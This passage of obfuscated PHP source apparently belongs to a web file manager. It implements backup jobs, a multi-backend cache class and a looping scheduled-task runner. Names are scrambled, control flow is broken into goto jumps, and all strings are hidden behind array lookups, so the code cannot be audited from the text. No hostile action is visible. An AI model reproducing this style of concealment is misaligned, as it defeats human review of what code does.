= array(); } if (isset($C™²øôÅï[$Eğ¶ê ¶ˆ‹[197]])) { $C™²øôÅï[$Eğ¶ê ¶ˆ‹[197]] = json_decode($C™²øôÅï[$Eğ¶ê ¶ˆ‹[197]], !0); } goto Cë²ÃÑŒ¿; a»ïãâÓà: $D¾­“Î±ãŞ = is_array($D¾­“Î±ãŞ) ? $D¾­“Î±ãŞ : array(); if (!isset($D¾­“Î±ãŞ[$Eğ¶ê ¶ˆ‹[731]])) { $D¾­“Î±ãŞ[$Eğ¶ê ¶ˆ‹[731]] = $Eğ¶ê ¶ˆ‹[87]; } unset($D¾­“Î±ãŞ[$Eğ¶ê ¶ˆ‹[1506]]); goto Cß«ê¡ßŠ‘; AÀÖğ«ê®õ: } public function listData($D™Úáœœ = false, $fö°ïÖ£´¯ = "\x6d\157\x64\x69\x66\171\124\x69\x6d\145", $Fë†¥£‘Äå = false) { return parent::listData($D™Úáœœ, $fö°ïÖ£´¯, !0); } public function lastItem() { $a’Š¡Øªì = $this->listData(); return !empty($a’Š¡Øªì[0]) ? $a’Š¡Øªì[0] : null; } public function kill($D–×¾îÈ¶¦) { goto DŞ¾ğÁÏ›‚; CÓŞ„¶‚î: $aÏ×‡ƒÖš = $cÒĞ¼†Úõß[$aßĞ˜Â‘[28]]; $fãùåˆ‘Ï = TEMP_FILES . $aßĞ˜Â‘[754] . $aÏ×‡ƒÖš . $aßĞ˜Â‘[8]; IO::remove($fãùåˆ‘Ï, !1); goto FšÏêôÒÀ; F±ÉçÃÊòõ: Task::kill($aßĞ˜Â‘[757]); Task::kill($aßĞ˜Â‘[780]); Task::kill($aßĞ˜Â‘[790]); goto CÓŞ„¶‚î; DŞ¾ğÁÏ›‚: $aßĞ˜Â‘ =& $_SERVER[úÉ·öƒÑì©]; $cÒĞ¼†Úõß = $this->listData($D–×¾îÈ¶¦); if (!$cÒĞ¼†Úõß || empty($cÒĞ¼†Úõß[$aßĞ˜Â‘[28]])) { return !0; } goto F±ÉçÃÊòõ; FšÏêôÒÀ: return $this->remove($D–×¾îÈ¶¦); goto b÷Ğä¥´¡§; b÷Ğä¥´¡§: } public function remove($bœò§§À÷) { $B§µ¨ãÄœ¹ = $this->listData($bœò§§À÷); if (!$B§µ¨ãÄœ¹) { return !0; } return $this->backupRemove($B§µ¨ãÄœ¹); } private function backupRemove($cÄÇ©…×Ìƒ) { parent::remove($cÄÇ©…×Ìƒ[$_SERVER[úÉ·öƒÑì©][402]]); $càÅÃÈËÕÚ = $this->backupPath($cÄÇ©…×Ìƒ); IO::remove($càÅÃÈËÕÚ, !1); return !0; } private function backupPath($dñˆ™Û¯áó) { $eÏŞÃº©ÑŠ =& $_SERVER[úÉ·öƒÑì©]; $dâñÅ™·££ = $dñˆ™Û¯áó[$eÏŞÃº©ÑŠ[28]]; $aäÃ÷ÀƒÌ = Model($eÏŞÃº©ÑŠ[746])->get($eÏŞÃº©ÑŠ[747]); $D²ï˜Êò² = substr(md5($eÏŞÃº©ÑŠ[748] . $aäÃ÷ÀƒÌ . $dâñÅ™·££), 0, 8); return "\173\x69\x6f\72{$dñˆ™Û¯áó[$eÏŞÃº©ÑŠ[728]]}\175\x2f\144\x61\164\x61\x62\141\163\145\x2f\142\141\x63\x6b\165\160\x2f" . $dâñÅ™·££ . $eÏŞÃº©ÑŠ[71] . $D²ï˜Êò²; } public function start() { goto e†ø¢°Úë; FÛ¢½Ğ»¨÷: Backup::set(array($F©¤ğ‡¾²Í[726] => 1, $F©¤ğ‡¾²Í[485] => time())); return !0; goto CÇ£åÃˆÅ; C©ğÔÛ©Á¦: if (!$eå¢êéÀ×œ || $eå¢êéÀ×œ[$F©¤ğ‡¾²Í[1506]] != $F©¤ğ‡¾²Í[87]) { return !1; } $DÄ¼ğ½—íÜ = $this->process(); foreach ($DÄ¼ğ½—íÜ as $A®Øæ–®) { if ($A®Øæ–®) { return Task::restart($A®Øæ–®[$F©¤ğ‡¾²Í[402]]); } } goto E×ğ¬”İ§; e†ø¢°Úë: $F©¤ğ‡¾²Í =& $_SERVER[úÉ·öƒÑì©]; if ($GLOBALS[$F©¤ğ‡¾²Í[6]][$F©¤ğ‡¾²Í[88]][$F©¤ğ‡¾²Í[1726]] != $F©¤ğ‡¾²Í[87]) { return !0; } $eå¢êéÀ×œ = $this->config(); goto C©ğÔÛ©Á¦; E×ğ¬”İ§: $céÂù´İÛ = new Backup(); $CÏî·Ä¿ÜÃ = $céÂù´İÛ->db(); if ($CÏî·Ä¿ÜÃ) { $CÏî·Ä¿ÜÃ = $céÂù´İÛ->dbFile(); if ($CÏî·Ä¿ÜÃ && $eå¢êéÀ×œ[$F©¤ğ‡¾²Í[731]] == $F©¤ğ‡¾²Í[191]) { $CÏî·Ä¿ÜÃ = $céÂù´İÛ->file(); } } goto FÛ¢½Ğ»¨÷; CÇ£åÃˆÅ: } public function process() { $e§áñŠÈ¨Ä =& $_SERVER[úÉ·öƒÑì©]; return array($e§áñŠÈ¨Ä[734] => Task::get($e§áñŠÈ¨Ä[757]), $e§áñŠÈ¨Ä[738] => Task::get($e§áñŠÈ¨Ä[780]), $e§áñŠÈ¨Ä[193] => Task::get($e§áñŠÈ¨Ä[790])); } public function restore() { $FòÉÇ”åå„ =& $_SERVER[úÉ·öƒÑì©]; ActionCall($FòÉÇ”åå„[1026], !0, 1); ActionCall($FòÉÇ”åå„[1026], !0, 0); } } goto F°Ãó—¢­Ô; f†õª’ÀÎŞ: class BackupDbFile { public function __construct() { } public function index() { goto f©ÉŞæ®; CÒğ¡¶ç: Backup::set($ağïèÁÆö); return !0; goto CîŸ àµ„¬; bÀ¹•ˆ¿ˆ: $cù¢»×™®¬ = $this->tmpFilesPath() . "\142\141\x63\153\x75\160\137{$cÀ™é¦Á}\57"; $BÎ³—ë¥¡ñ = $this->backupPath($fù²ÒëÍÏ); if (!($BÎ³—ë¥¡ñ = IO::mkdir($BÎ³—ë¥¡ñ))) { return !1; } goto eìŠ‹ËëÉ·; f©ÉŞæ®: $eášÂÚ™ñŸ =& $_SERVER[úÉ·öƒÑì©]; $fù²ÒëÍÏ = Backup::get(); $cÀ™é¦Á = $fù²ÒëÍÏ[$eášÂÚ™ñŸ[28]]; goto bÀ¹•ˆ¿ˆ; b Öçé×¦Ø: if (!$bÃÎŞœ”ø¼) { return !1; } $ağïèÁÆö = array($eášÂÚ™ñŸ[778] => $bÃÎŞœ”ø¼, $eášÂÚ™ñŸ[779] => time()); Backup::set($ağïèÁÆö); goto c™ÌÇ‰ã«; eìŠ‹ËëÉ·: $Cäóñ°ìª = IO::listPath($cù¢»×™®¬); $fÈ·Ğ—˜ ’ = isset($Cäóñ°ìª[$eášÂÚ™ñŸ[74]]) ? $Cäóñ°ìª[$eášÂÚ™ñŸ[74]] : array(); $bÃÎŞœ”ø¼ = array_sum(array_column($fÈ·Ğ—˜ ’, $eášÂÚ™ñŸ[78])); goto b Öçé×¦Ø; c™ÌÇ‰ã«: $d•Í¥ĞÍğ» = new TaskFileTransfer($eášÂÚ™ñŸ[780], $eášÂÚ™ñŸ[758], count($fÈ·Ğ—˜ ’), LNG($eášÂÚ™ñŸ[759]) . $eášÂÚ™ñŸ[449] . LNG($eášÂÚ™ñŸ[761]) . $eášÂÚ™ñŸ[781]); $d•Í¥ĞÍğ»->task[$eášÂÚ™ñŸ[739]] = $bÃÎŞœ”ø¼; foreach ($Cäóñ°ìª[$eášÂÚ™ñŸ[74]] as $EŠ†ŠöëÜ) { $fÕÜªÔàÁÁ = IO::move($EŠ†ŠöëÜ[$eášÂÚ™ñŸ[76]], $BÎ³—ë¥¡ñ); if (!$fÕÜªÔàÁÁ) { $d•Í¥ĞÍğ»->end(); $DÎÕø¼±« = IO::getLastError($eášÂÚ™ñŸ[782] . $EŠ†ŠöëÜ[$eášÂÚ™ñŸ[76]] . $eášÂÚ™ñŸ[783] . $BÎ³—ë¥¡ñ . $eášÂÚ™ñŸ[513]); write_log($DÎÕø¼±«, $eášÂÚ™ñŸ[758]); return !1; } } goto A¨•ª™ª¶; A¨•ª™ª¶: $eö¼¯º«¶± = CONTROLLER_DIR . $eášÂÚ™ñŸ[784]; $D±«—Öâš = CONTROLLER_DIR . $eášÂÚ™ñŸ[785]; IO::copy($eö¼¯º«¶±, $BÎ³—ë¥¡ñ); goto EÒ°è£³Ğø; EÒ°è£³Ğø: IO::copy($D±«—Öâš, $BÎ³—ë¥¡ñ); $d•Í¥ĞÍğ»->end(); $ağïèÁÆö = array($eášÂÚ™ñŸ[786] => $bÃÎŞœ”ø¼, $eášÂÚ™ñŸ[787] => time()); goto CÒğ¡¶ç; CîŸ àµ„¬: } private function backupPath($dæ´Õ‰Ÿ“) { $A¸—±ƒãÌğ =& $_SERVER[úÉ·öƒÑì©]; $d°¦Şˆ”¶ñ = $dæ´Õ‰Ÿ“[$A¸—±ƒãÌğ[28]]; $eÃ×„šåí = Model($A¸—±ƒãÌğ[746])->get($A¸—±ƒãÌğ[747]); $B®ÉáĞ÷¢Ü = substr(md5($A¸—±ƒãÌğ[748] . $eÃ×„šåí . $d°¦Şˆ”¶ñ), 0, 8); return "\173\x69\x6f\72{$dæ´Õ‰Ÿ“[$A¸—±ƒãÌğ[728]]}\175\x2f\x64\141\x74\x61\142\x61\163\145\57\142\x61\143\x6b\x75\160\x2f" . $d°¦Şˆ”¶ñ . $A¸—±ƒãÌğ[71] . $B®ÉáĞ÷¢Ü; } private function tmpFilesPath() { $dŞå ¦ª™“ =& $_SERVER[úÉ·öƒÑì©]; $AğØ½®Òš¡ = TEMP_FILES; if ($GLOBALS[$dŞå ¦ª™“[6]][$dŞå ¦ª™“[88]][$dŞå ¦ª™“[776]]) { $AğØ½®Òš¡ = $GLOBALS[$dŞå ¦ª™“[6]][$dŞå ¦ª™“[88]][$dŞå ¦ª™“[776]]; if (!mk_dir($AğØ½®Òš¡) || !is_writable($AğØ½®Òš¡) || !IO::mkfile($AğØ½®Òš¡ . $dŞå ¦ª™“[777])) { $AğØ½®Òš¡ = TEMP_FILES; } } return $AğØ½®Òš¡; } } class BackupFile { public function __construct() { } public function index() { goto F™Õ©ÁóÎ; EªÅöÉæ°‡: $d•„¤²ÙÛÉ = !0; $e¡ÎÛÌÊÃ = $this->storeIds(); $eíˆŒŠË˜Ê = 1; goto fù²‘œ†›À; B¿•’¿çÈÉ: $B¸îĞ–”° = (int) Model($_SERVER[úÉ·öƒÑì©][763])->where($cñÉ¿æ§óˆ)->count($_SERVER[úÉ·öƒÑì©][456]); $B…™òÃª² = (int) Model($_SERVER[úÉ·öƒÑì©][763])->where($cñÉ¿æ§óˆ)->sum($_SERVER[úÉ·öƒÑì©][78]); $cîÔŒ±î¢‹ = new TaskFileTransfer($_SERVER[úÉ·öƒÑì©][790], $_SERVER[úÉ·öƒÑì©][758], $B¸îĞ–”°, LNG($_SERVER[úÉ·öƒÑì©][759]) . $_SERVER[úÉ·öƒÑì©][760] . LNG($_SERVER[úÉ·öƒÑì©][791])); goto cé¬˜·á±Á; fîÖÄíéùÔ: $this->_fileFilter($EäÎ»Ùèêâ); return !0; goto fâÄÏÇã°›; cé¬˜·á±Á: $cîÔŒ±î¢‹->task[$_SERVER[úÉ·öƒÑì©][739]] = $B…™òÃª²; $céïÎœ›¸ = array($_SERVER[úÉ·öƒÑì©][792] => $B¸îĞ–”°, $_SERVER[úÉ·öƒÑì©][793] => $B…™òÃª², $_SERVER[úÉ·öƒÑì©][794] => time()); Backup::set($céïÎœ›¸); goto EªÅöÉæ°‡; CÏ¥¢Ø²Ÿ: $céïÎœ›¸ = array($_SERVER[úÉ·öƒÑì©][804] => 1, $_SERVER[úÉ·öƒÑì©][485] => time(), $_SERVER[úÉ·öƒÑì©][751] => 1, $_SERVER[úÉ·öƒÑì©][801] => $A¾¨±”„õ…, $_SERVER[úÉ·öƒÑì©][793] => $B…™òÃª², $_SERVER[úÉ·öƒÑì©][792] => $B¸îĞ–”°, $_SERVER[úÉ·öƒÑì©][805] => time()); if ($B‘êÓ”æš†) { $céïÎœ›¸[$_SERVER[úÉ·öƒÑì©][802]] = $cƒÂåõ½–÷; $céïÎœ›¸[$_SERVER[úÉ·öƒÑì©][803]] = $B‘Œ»ÓÅ¾; } Backup::set($céïÎœ›¸); goto fîÖÄíéùÔ; E¦Äòø³¨”: $B‘Œ»ÓÅ¾ = $cƒÂåõ½–÷ = 0; do { $bñ‡™©îœ = $_SERVER[úÉ·öƒÑì©][795]; $AñÏ¥ÃÂ¸¤ = Model($_SERVER[úÉ·öƒÑì©][763])->where($cñÉ¿æ§óˆ)->field($bñ‡™©îœ)->order($_SERVER[úÉ·öƒÑì©][796])->selectPage($E…’ÂÖø„Œ, $eíˆŒŠË˜Ê); $B®÷¬½Ø…² = !empty($AñÏ¥ÃÂ¸¤[$_SERVER[úÉ·öƒÑì©][376]]) ? $AñÏ¥ÃÂ¸¤[$_SERVER[úÉ·öƒÑì©][376]] : array(); foreach ($B®÷¬½Ø…² as $D½ ½Ù„Ø) { goto e­³µÛ¾ƒ‡; e­³µÛ¾ƒ‡: if (!$this->_fileExist($D½ ½Ù„Ø, $EäÎ»Ùèêâ, $e¡ÎÛÌÊÃ)) { $B¸îĞ–”° -= 1; $B…™òÃª² -= (int) $D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][78]]; write_log("\x66\x69\x6c\x65\40\x6e\x6f\x74\x20\x65\170\151\163\164\x2e\x66\x69\x6c\145\x49\104\x3a{$D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][456]]}\54\40\160\141\164\150\72{$D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][76]]}", $_SERVER[úÉ·öƒÑì©][797]); continue; } $cÍ†ÃÃ†ô = $D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][76]]; $EÒ¶õ«¤‘Ò = "\x7b\151\157\72{$c²ô¼Ÿ®æ[$_SERVER[úÉ·öƒÑì©][728]]}\175" . substr($cÍ†ÃÃ†ô, strlen("\173\151\x6f\x3a{$D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][798]]}\x7d")); goto Bˆ«ŠÂ·ƒâ; a×Ë¿”Î˜: $C÷„’èì´Ì += $D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][78]]; $cƒÂåõ½–÷ += 1; $B‘Œ»ÓÅ¾ += $D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][78]]; goto a³Ÿ¦ä¹—Ë; Bˆ«ŠÂ·ƒâ: if (IO::exist($EÒ¶õ«¤‘Ò)) { $cîÔŒ±î¢‹->updateFileEnd($D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][28]], $D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][78]]); } else { $EÒ¶õ«¤‘Ò = get_path_father($EÒ¶õ«¤‘Ò); IO::mkdir($EÒ¶õ«¤‘Ò); if (!IO::copy($cÍ†ÃÃ†ô, $EÒ¶õ«¤‘Ò, $_SERVER[úÉ·öƒÑì©][799])) { write_log($_SERVER[úÉ·öƒÑì©][800] . $cÍ†ÃÃ†ô . $_SERVER[úÉ·öƒÑì©][783] . $EÒ¶õ«¤‘Ò . $_SERVER[úÉ·öƒÑì©][513], $_SERVER[úÉ·öƒÑì©][758]); $d•„¤²ÙÛÉ = !1; break; } } $A¾¨±”„õ… = $D½ ½Ù„Ø[$_SERVER[úÉ·öƒÑì©][456]]; $B‘êÓ”æš† += 1; goto a×Ë¿”Î˜; a³Ÿ¦ä¹—Ë: if ($C÷„’èì´Ì >= 1024 * 1024 * 100) { $céïÎœ›¸ = array($_SERVER[úÉ·öƒÑì©][801] => $A¾¨±”„õ…, $_SERVER[úÉ·öƒÑì©][802] => $cƒÂåõ½–÷, $_SERVER[úÉ·öƒÑì©][803] => $B‘Œ»ÓÅ¾); Backup::set($céïÎœ›¸); $C÷„’èì´Ì = $B‘êÓ”æš† = 0; } goto fš§çˆÏÙÕ; fš§çˆÏÙÕ: } $AÈİê…Œã² = count($B®÷¬½Ø…²); $eíˆŒŠË˜Ê++; } while ($AÈİê…Œã² == $E…’ÂÖø„Œ); $cîÔŒ±î¢‹->end(); goto CÏ¥¢Ø²Ÿ; F™Õ©ÁóÎ: $c²ô¼Ÿ®æ = Backup::get(); $A¾¨±”„õ… = $c²ô¼Ÿ®æ[$_SERVER[úÉ·öƒÑì©][300]][$_SERVER[úÉ·öƒÑì©][193]][$_SERVER[úÉ·öƒÑì©][456]]; $cñÉ¿æ§óˆ = array($_SERVER[úÉ·öƒÑì©][457] => array($_SERVER[úÉ·öƒÑì©][788], $A¾¨±”„õ…), $_SERVER[úÉ·öƒÑì©][789] => array($_SERVER[úÉ·öƒÑì©][338], $c²ô¼Ÿ®æ[$_SERVER[úÉ·öƒÑì©][728]])); goto B¿•’¿çÈÉ; fù²‘œ†›À: $E…’ÂÖø„Œ = 1000; $C÷„’èì´Ì = $B‘êÓ”æš† = 0; $EäÎ»Ùèêâ = array(); goto E¦Äòø³¨”; fâÄÏÇã°›: } private function _fileExist($C¥ìíá´ïà, &$E °¥ÀïÜª, $D”£ØöÂÉ¿) { goto e¥‘ƒ“„¸¡; eİÊ®×Ê: $E °¥ÀïÜª = array_merge($E °¥ÀïÜª, array_to_keyvalue($b¶¼ùğƒÆÃ, $a¬†ª³Íò[33], $a¬†ª³Íò[456])); return !1; goto cªê²îø©ğ; B“¸–°“î: if (!in_array($C¥ìíá´ïà[$a¬†ª³Íò[798]], $D”£ØöÂÉ¿)) { return !1; } if (IO::exist($d†õÖï‘Ø)) { return !0; } $c·©İØİŒ = get_path_father($d†õÖï‘Ø); goto fÄÓŠÉÍÔ²; e¥‘ƒ“„¸¡: $a¬†ª³Íò =& $_SERVER[úÉ·öƒÑì©]; $d†õÖï‘Ø = $C¥ìíá´ïà[$a¬†ª³Íò[76]]; if (in_array($C¥ìíá´ïà[$a¬†ª³Íò[456]], $E °¥ÀïÜª)) { return !1; } goto B“¸–°“î; fÄÓŠÉÍÔ²: if (IO::exist($c·©İØİŒ)) { $E °¥ÀïÜª[] = $C¥ìíá´ïà[$a¬†ª³Íò[456]]; return !1; } $aäÍµ×æî£ = array($a¬†ª³Íò[798] => $C¥ìíá´ïà[$a¬†ª³Íò[798]], $a¬†ª³Íò[76] => array($a¬†ª³Íò[389], "{$c·©İØİŒ}\x25")); $b¶¼ùğƒÆÃ = Model($a¬†ª³Íò[763])->where($aäÍµ×æî£)->field($a¬†ª³Íò[457])->select(); goto eİÊ®×Ê; cªê²îø©ğ: } private function _fileFilter($E–š®åØ†ñ) { $AëÙ•Ã¥Ò… =& $_SERVER[úÉ·öƒÑì©]; if (empty($E–š®åØ†ñ)) { return; } $F‰††ƒ‚¿À = array($AëÙ•Ã¥Ò…[456] => array($AëÙ•Ã¥Ò…[7], array_unique($E–š®åØ†ñ))); $A°³Ïİ‡×ª = Model($AëÙ•Ã¥Ò…[806])->where($F‰††ƒ‚¿À)->field($AëÙ•Ã¥Ò…[404])->select(); foreach ($A°³Ïİ‡×ª as $B“†º¤ØÂ) { Model($AëÙ•Ã¥Ò…[806])->remove($B“†º¤ØÂ[$AëÙ•Ã¥Ò…[404]], !1); } } private function storeIds() { $b¢Ä³ùå =& $_SERVER[úÉ·öƒÑì©]; $AÄÙ²«Şª£ = Model($b¢Ä³ùå[743])->listData(); $e¥Ãæí»ù = array(); $C×Ãê‚‰ï = $GLOBALS[$b¢Ä³ùå[6]][$b¢Ä³ùå[88]][$b¢Ä³ùå[807]]; foreach ($AÄÙ²«Şª£ as $Eİäøà‹Ñ—) { $bÄèÃ©Óñ = strtolower($Eİäøà‹Ñ—[$b¢Ä³ùå[94]]); if (!isset($C×Ãê‚‰ï[$bÄèÃ©Óñ])) { continue; } $Fï”íâùÉŠ = $b¢Ä³ùå[72] . (isset($C×Ãê‚‰ï[$bÄèÃ©Óñ]) ? $C×Ãê‚‰ï[$bÄèÃ©Óñ] : ucfirst($bÄèÃ©Óñ)); if (!class_exists($Fï”íâùÉŠ)) { continue; } $e¥Ãæí»ù[] = $Eİäøà‹Ñ—[$b¢Ä³ùå[402]]; } return $e¥Ãæí»ù; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto F¨¡·¸§ï„; F¨¡·¸§ï„: $FÙò¾õÎÎ =& $_SERVER[úÉ·öƒÑì©]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto CÛø½Çî; CŒ®Ñåˆ—Î: switch ($DÏì£Ü×«¹[$FÙò¾õÎÎ[808]]) { case $FÙò¾õÎÎ[17]: self::$handle = Model($FÙò¾õÎÎ[810]); break; case $FÙò¾õÎÎ[811]: self::$handle = new CacheRedis($e¯ŒÓĞÇÂ·, $e©ÁâˆÚŸ‘); break; case $FÙò¾õÎÎ[812]: self::$handle = new CacheMemcached($e¯ŒÓĞÇÂ·, $e©ÁâˆÚŸ‘); break; case $FÙò¾õÎÎ[193]: self::$handle = new CacheFile($e¯ŒÓĞÇÂ·, $e©ÁâˆÚŸ‘); break; default: break; } return self::$handle; goto f“íÍñø„; CÛø½Çî: $DÏì£Ü×«¹ = $GLOBALS[$FÙò¾õÎÎ[6]][$FÙò¾õÎÎ[356]]; $e¯ŒÓĞÇÂ· = $DÏì£Ü×«¹[$DÏì£Ü×«¹[$FÙò¾õÎÎ[808]]]; $e©ÁâˆÚŸ‘ = $DÏì£Ü×«¹[$FÙò¾õÎÎ[809]]; goto CŒ®Ñåˆ—Î; f“íÍñø„: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Eİù“ãô‘) { if (is_array($Eİù“ãô‘) || is_object($Eİù“ãô‘)) { $Eİù“ãô‘ = json_encode($Eİù“ãô‘); } $Eİù“ãô‘ = rawurlencode($Eİù“ãô‘); return md5(KOD_SITE_ID . $_SERVER[úÉ·öƒÑì©][71] . $Eİù“ãô‘); } public static function get($Cêó„ƒ—šö, $D¸×ø¯‰×¨ = false) { $e„ÜŸ”Í¸£ = self::key($Cêó„ƒ—šö); if ($D¸×ø¯‰×¨) { return unserialize(self::init()->get($e„ÜŸ”Í¸£)); } if (!isset(self::$memoryCache[$e„ÜŸ”Í¸£])) { $E“òÂÌ‹‘Ú = self::init()->get($e„ÜŸ”Í¸£); self::$memoryCache[$e„ÜŸ”Í¸£] = unserialize($E“òÂÌ‹‘Ú); } return self::$memoryCache[$e„ÜŸ”Í¸£]; } public static function set($AÙÅôïÜ…, $cˆŠ±…Ğé“, $AÙ…§¦Ì¿ = false) { goto aÊÒØ¡ÜĞğ; aÊÒØ¡ÜĞğ: $A«µ¨»ó³¤ = self::key($AÙÅôïÜ…); if (isset(self::$memoryCache[$A«µ¨»ó³¤]) && self::$memoryCache[$A«µ¨»ó³¤] === $cˆŠ±…Ğé“) { return !0; } if ($AÙ…§¦Ì¿ === 0) { self::$memoryCache[$A«µ¨»ó³¤] = $cˆŠ±…Ğé“; return !0; } goto e¬õ³Á©ÚŒ; e¬õ³Á©ÚŒ: CacheLock::lock($AÙÅôïÜ…); $b­±ß¼Õ = self::init()->set($A«µ¨»ó³¤, serialize($cˆŠ±…Ğé“), $AÙ…§¦Ì¿); self::$memoryCache[$A«µ¨»ó³¤] = $cˆŠ±…Ğé“; goto B¢õßÓ¹î; B¢õßÓ¹î: CacheLock::unlock($AÙÅôïÜ…); return $b­±ß¼Õ; goto E„Ñ«®óØ; E„Ñ«®óØ: } public static function getCall($fŒéƒ¤¿…ˆ, $c§×‘©•ù, $Då“–î–ÄÒ, $F‚ĞÁ²…ìµ = array()) { goto fòÁ©İ–¨; fòÁ©İ–¨: $e‘…ºÏ®•Ó =& $_SERVER[úÉ·öƒÑì©]; $e„¸åˆ‰¦œ = self::get($fŒéƒ¤¿…ˆ); if ($e„¸åˆ‰¦œ || $e„¸åˆ‰¦œ === $e‘…ºÏ®•Ó[33]) { return $e„¸åˆ‰¦œ; } goto F´ğŞ¨; F´ğŞ¨: $e„¸åˆ‰¦œ = call_user_func_array($Då“–î–ÄÒ, $F‚ĞÁ²…ìµ); $e„¸åˆ‰¦œ = $e„¸åˆ‰¦œ ? $e„¸åˆ‰¦œ : $e‘…ºÏ®•Ó[33]; self::set($fŒéƒ¤¿…ˆ, $e„¸åˆ‰¦œ, $c§×‘©•ù); goto A©İÈ¼„Ş; A©İÈ¼„Ş: return $e„¸åˆ‰¦œ; goto c†ğ¢Šôç¥; c†ğ¢Šôç¥: } public static function remove($E»Åé•„İ­) { goto a»×àî™øÑ; e¥ÜËóéÅø: return $f“××…; goto eµíƒŠ÷‡²; a»×àî™øÑ: $e¶ÌÛÎáŠ = self::key($E»Åé•„İ­); unset(self::$memoryCache[$e¶ÌÛÎáŠ]); self::clearTimeout(); goto FŞñê‡ãÄä; FŞñê‡ãÄä: CacheLock::lock($E»Åé•„İ­); $f“××… = self::init()->remove($e¶ÌÛÎáŠ); CacheLock::unlock($E»Åé•„İ­); goto e¥ÜËóéÅø; eµíƒŠ÷‡²: } public static function removeMemory($aï÷£æó†ù) { $a‰ÎÄÇøƒë = self::key($aï÷£æó†ù); unset(self::$memoryCache[$a‰ÎÄÇøƒë]); } public static function clearMemory($E±ùØÅŒ à = false) { if ($E±ùØÅŒ à) { $E±ùØÅŒ à = self::key($E±ùØÅŒ à); unset(self::$memoryCache[$E±ùØÅŒ à]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[úÉ·öƒÑì©][813])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[úÉ·öƒÑì©][814])) { self::init()->clearTimeout(); } } } goto FŒ±Í±…Ûø; c¤é®›À¿Í: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto AŒˆÆ¥‡íê; eÀìÍªÄ¸©: while (!0) { self::cacheClear(); if (self::valueGet($A©ó²”ÛÔÇ[726]) != $A©ó²”ÛÔÇ[87]) { self::valueSet($A©ó²”ÛÔÇ[1499], $A©ó²”ÛÔÇ[191]); self::log($A©ó²”ÛÔÇ[1503]); die; } self::valueSet($A©ó²”ÛÔÇ[1499], $A©ó²”ÛÔÇ[87]); self::valueSet($A©ó²”ÛÔÇ[1500], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto dÜ…èÖÑ«‘; AŒˆÆ¥‡íê: $A©ó²”ÛÔÇ =& $_SERVER[úÉ·öƒÑì©]; if (self::valueGet($A©ó²”ÛÔÇ[726]) != $A©ó²”ÛÔÇ[87]) { return; } if (self::valueGet($A©ó²”ÛÔÇ[1499]) == $A©ó²”ÛÔÇ[87]) { $DáøÂŞ†ƒÁ = self::valueGet($A©ó²”ÛÔÇ[1500]); if (time() - $DáøÂŞ†ƒÁ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto a¡”£ãŸåÙ; a¡”£ãŸåÙ: http_close(); self::valueSet($A©ó²”ÛÔÇ[1499], $A©ó²”ÛÔÇ[87]); Hook::bind($A©ó²”ÛÔÇ[1501], $A©ó²”ÛÔÇ[1502]); goto eÀìÍªÄ¸©; dÜ…èÖÑ«‘: } public static function restart() { $BáÑ¢ÍÊãğ =& $_SERVER[úÉ·öƒÑì©]; http_close(); self::valueSet($BáÑ¢ÍÊãğ[726], $BáÑ¢ÍÊãğ[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($BáÑ¢ÍÊãğ[1499], $BáÑ¢ÍÊãğ[191]); self::valueSet($BáÑ¢ÍÊãğ[726], $BáÑ¢ÍÊãğ[87]); } public static function shutdownEvent() { $F£©ĞÊ·Ö =& $_SERVER[úÉ·öƒÑì©]; self::valueSet($F£©ĞÊ·Ö[1499], $F£©ĞÊ·Ö[191]); self::log($F£©ĞÊ·Ö[1504]); } public static function config($D†Á©ÎÄÔ³, $DñÚğÜë¢) { self::valueSet($_SERVER[úÉ·öƒÑì©][726], $D†Á©ÎÄÔ³); } private static function taskRunAll() { goto eÀÁÛ”š; AÉ›Âõ©: $C›œÎí° = count($b”Î‰ØÊŒÅ); for ($bšÇ¹°˜§Í = 0; $bšÇ¹°˜§Í < $C›œÎí°; $bšÇ¹°˜§Í++) { $CñµÖöáí = $b”Î‰ØÊŒÅ[$bšÇ¹°˜§Í]; if (!$CñµÖöáí[$a¦ã„Û¢ÑÍ[402]] || $CñµÖöáí[$a¦ã„Û¢ÑÍ[1506]] != $a¦ã„Û¢ÑÍ[87]) { continue; } if (!self::taskTimeCheck($CñµÖöáí)) { continue; } self::taskRun($CñµÖöáí); } Hook::trigger($a¦ã„Û¢ÑÍ[1507]); goto BÃ·ÃÌì; BÃ·ÃÌì: self::taskQueueRun($fÃ¨•¾ÛìÃ); self::closeDatabase(); goto aè“¢ÊóÍ±; eÀÁÛ”š: $a¦ã„Û¢ÑÍ =& $_SERVER[úÉ·öƒÑì©]; $fÃ¨•¾ÛìÃ = timeFloat(); $b”Î‰ØÊŒÅ = Model($a¦ã„Û¢ÑÍ[1505])->listData(); goto AÉ›Âõ©; aè“¢ÊóÍ±: } private static function taskQueueRun($DÁ¶ö±æ©‡) { $Ešİš«Ïô¬ = 10; while (!0) { $eº¶øõ«­˜ = TaskQueue::run(); if ($eº¶øõ«­˜ === !1) { break; } if (timeFloat() - $DÁ¶ö±æ©‡ >= $Ešİš«Ïô¬) { break; } } } private static function taskTimeCheck($f©ëÃ«ùå) { goto E‡›ñ™¯ß„; E‡›ñ™¯ß„: $DË¬ÑÕ”Å‚ =& $_SERVER[úÉ·öƒÑì©]; $fº˜§“ Ì­ = json_decode($f©ëÃ«ùå[$DË¬ÑÕ”Å‚[197]], !0); $F¯éåÆµŸ = intval($f©ëÃ«ùå[$DË¬ÑÕ”Å‚[1500]]); goto 